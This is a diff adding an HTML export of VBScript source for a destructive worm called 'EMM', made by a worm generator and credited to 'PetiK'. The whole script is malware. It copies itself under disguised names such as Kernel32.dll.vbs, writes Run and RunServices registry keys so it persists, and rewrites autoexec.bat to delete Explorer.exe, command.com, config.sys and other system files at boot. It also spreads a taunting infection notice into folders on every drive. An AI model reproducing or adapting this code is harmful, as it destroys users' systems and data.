@@ -1,0 +1,95 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>Exported from Notepad++</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	font-weight: bold;
+	color: #FF0000;
+}
+.sc3 {
+	color: #0000FF;
+}
+.sc4 {
+	color: #808080;
+}
+.sc6 {
+	font-weight: bold;
+}
+.sc7 {
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc3">on</span><span class="sc0"> </span><span class="sc3">error</span><span class="sc0"> </span><span class="sc3">resume</span><span class="sc0"> </span><span class="sc3">next</span><span class="sc0">
+</span><span class="sc3">dim</span><span class="sc0"> </span><span class="sc7">Fso</span><span class="sc0">
+</span><span class="sc3">dim</span><span class="sc0"> </span><span class="sc7">regi</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc0"> </span><span class="sc4">"Scripting.FileSystemObject"</span><span class="sc0"> </span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">regi</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc0"> </span><span class="sc4">"WScript.Shell"</span><span class="sc0"> </span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">fso.copyfile</span><span class="sc0"> </span><span class="sc7">wscript.scriptfullname</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)&amp;</span><span class="sc0"> </span><span class="sc4">"\Kernel32.dll.vbs"</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
+</span><span class="sc7">fso.copyfile</span><span class="sc0"> </span><span class="sc7">wscript.scriptfullname</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\PicView.exe.vbs"</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
+</span><span class="sc7">fso.copyfile</span><span class="sc0"> </span><span class="sc7">wscript.scriptfullname</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"C:\ReadMe.txt.vbs"</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
+</span><span class="sc7">regi.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"PicView"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\PicView.exe.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">regi.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Kernel32"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)&amp;</span><span class="sc0"> </span><span class="sc4">"\Kernel32.dll.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">regi.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"ReadMe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"C:\ReadMe.txt.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Script</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Fso.CreateTextFile</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"C:\autoexec.bat"</span><span class="sc6">,</span><span class="sc3">true</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">Script.Writeline</span><span class="sc0"> </span><span class="sc4">"@echo off"</span><span class="sc0">
+</span><span class="sc7">Script.Writeline</span><span class="sc0"> </span><span class="sc4">"del "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\Explorer.exe"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" &gt;nul"</span><span class="sc0">
+</span><span class="sc7">Script.Writeline</span><span class="sc0"> </span><span class="sc4">"del "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\win.ini"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" &gt;nul"</span><span class="sc0">
+</span><span class="sc7">Script.Writeline</span><span class="sc0"> </span><span class="sc4">"del "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\Himem.sys"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" &gt;nul"</span><span class="sc0">
+</span><span class="sc7">Script.Writeline</span><span class="sc0"> </span><span class="sc4">"del "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\User.exe"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" &gt;nul"</span><span class="sc0">
+</span><span class="sc7">Script.Writeline</span><span class="sc0"> </span><span class="sc4">"del config.sys &gt;nul"</span><span class="sc0">
+</span><span class="sc7">Script.Writeline</span><span class="sc0"> </span><span class="sc4">"del command.com &gt;nul"</span><span class="sc0">
+</span><span class="sc7">Script.Writeline</span><span class="sc0"> </span><span class="sc4">"echo ----------------"</span><span class="sc0">
+</span><span class="sc7">Script.Writeline</span><span class="sc0"> </span><span class="sc4">"echo Author: PetiK"</span><span class="sc0">
+</span><span class="sc7">Script.Writeline</span><span class="sc0"> </span><span class="sc4">"echo Little Boy VBS-Worm Generator/2001/ Acidcookie / www.vxbiolabs.cjb.net"</span><span class="sc0">
+</span><span class="sc7">Script.Writeline</span><span class="sc0"> </span><span class="sc4">"echo ----------------"</span><span class="sc0">
+</span><span class="sc7">Script.Close</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Script1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Fso.CreateTextFile</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\desktop\HEY LUSER READ THIS - NOW.txt"</span><span class="sc6">,</span><span class="sc3">true</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">Script1.Writeline</span><span class="sc0"> </span><span class="sc4">"You are infect by: PetiK"</span><span class="sc0">
+</span><span class="sc7">Script1.Writeline</span><span class="sc0"> </span><span class="sc4">"This is VBS Virii created by VBS-Worm Generator/2001/"</span><span class="sc0">
+</span><span class="sc7">Script1.Writeline</span><span class="sc0"> </span><span class="sc4">"Acidcookie / www.vxbiolabs.cjb.net"</span><span class="sc0">
+</span><span class="sc7">Script1.Close</span><span class="sc0">
+</span><span class="sc7">dodrives</span><span class="sc0">
+</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">Dodrives</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Drives</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.Drives</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">Drive</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">Drives</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Drive.Drivetype</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Remote</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">Drivefull</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Drive</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
+</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">Subfolders</span><span class="sc6">(</span><span class="sc7">Drivefull</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">ElseIf</span><span class="sc0"> </span><span class="sc7">Drive.IsReady</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">Drivefull</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Drive</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
+</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">Subfolders</span><span class="sc6">(</span><span class="sc7">Drivefull</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
+</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">Subfolders</span><span class="sc6">(</span><span class="sc7">path</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">newpath</span><span class="sc6">=</span><span class="sc7">path</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Fold</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.GetFolder</span><span class="sc6">(</span><span class="sc7">newpath</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Files</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Fold.Files</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">file</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">Files</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">fso.GetExtensionName</span><span class="sc6">(</span><span class="sc7">file.path</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"txt"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">kopi</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.GetFile</span><span class="sc6">(</span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\desktop\HEY LUSER READ THIS - NOW.txt"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">kopi.copy</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">fold.path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\HEY LUSER READ THIS - NOW.txt"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">file</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Fold.Subfolders</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">Subfol</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">file</span><span class="sc0">
+</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">Subfolders</span><span class="sc6">(</span><span class="sc7">Subfol.path</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
+</span><span class="sc1">'Name of virii is: EMM
+'This virii is created by Little Boy VBS-Worm Generator/2001/ Acidcookie  / www.vxbiolabs.cjb.net
+</span></div></body>
+</html>
